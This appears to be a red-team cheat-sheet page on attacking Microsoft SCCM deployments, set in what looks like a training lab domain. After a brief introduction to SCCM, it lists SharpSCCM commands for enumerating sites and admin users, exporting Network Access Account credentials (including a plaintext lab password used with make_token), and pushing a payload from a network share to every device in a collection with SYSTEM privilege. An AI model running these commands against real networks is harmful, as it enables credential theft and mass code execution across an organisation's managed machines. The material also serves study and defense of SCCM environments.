---
description: Software Center Configuration Manager
---

# SCCM

Imagine you are a Network Administrator managing tens of computer labs and all staffs' laptops in a university. All the PCs, regarding OS, that is including Windows, Linux and MacOS are joined to the AD domain. One day, WannaCry become a thing and you are tasks to install security patches on all PCs. Are you going to boot up all PCs in the labs one by one and perform a Windows update through settings manually?

SCCM is a Microsoft product that is used for managing the deployment and configuration of devices in an organization. SCCM provides a comprehensive solution for tasks such as operating system deployment, software distribution, patch management, and hardware inventory. In the above scenario, installing security patches for WannaCry become easier with SCCM.

SCCM console installer can be downloaded [here](https://www.microsoft.com/en-us/evalcenter/download-microsoft-endpoint-configuration-manager).

## Enumeration

The first step when attacking SCCM is to get a feel for the deployment topology, which devices are being managed, and who the administrative users are using the [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) tool.&#x20;

```shell
SharpSCCM.exe local site-info --no-banner

-----------------------------------
CurrentManagementPoint: scm-1.cyberbotic.io
Name: SMS:S01
-----------------------------------

# OR run via PowerShell:
Get-WmiObject -Class SMS_Authority -Namespace root\CCM | select Name, CurrentManagementPoint | fl
```

Depending on the user's privilege you have when you run the above command, you may see different results. Use the code below to enumerate SCCM administrative users.\


```powershell
SharpSCCM.exe get class-instances SMS_Admin --no-banner
SharpSCCM.exe get collection-members -n DEV --no-banner
SharpSCCM.exe get devices -n WKSTN -p Name -p FullDomainName -p IPAddresses -p LastLogonUserName -p OperatingSystemNameandVersion --no-banner
```

## Attack Path

### **Export NAAs Credentials**

```powershell
SharpSCCM.exe local naa -m wmi --no-banner
SharpSCCM.exe local naa -m disk --no-banner
make_token cyberbotic.io\sccm_svc Cyberb0tic
```

### **Deploy Malicious Script**

```powershell
# To execute a command on every device in the DEV collection
SharpSCCM.exe exec -n DEV -p C:\Windows\notepad.exe --no-banner

# Execute dns_x64.exe payload with SYSTEM privilege with -s flag
SharpSCCM.exe exec -n DEV -p "C:\Windows\System32\cmd.exe /c start /b \\dc-2\software\dns_x64.exe" -s --no-banner
```
